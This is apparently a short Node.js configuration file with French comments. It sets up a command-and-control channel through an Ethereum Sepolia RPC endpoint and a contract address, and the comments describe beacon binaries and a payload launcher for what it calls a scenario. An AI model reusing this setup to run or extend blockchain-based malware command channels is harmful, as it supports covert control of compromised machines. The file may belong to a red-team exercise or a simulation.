'use strict';
// Config canal C2 — valeurs réelles du scénario (Sepolia).
// Les binaires beacon (bin/) embarquent drip-key + pubkey au build Go ;
// ici seul le canal node (payload/launcher) est configuré.
module.exports = {
  RPC_URL: 'https://ethereum-sepolia-rpc.publicnode.com',
  CONTRACT: '0xEF025c8AF567A502BDffCdd1aEf26037046f70BB'
};
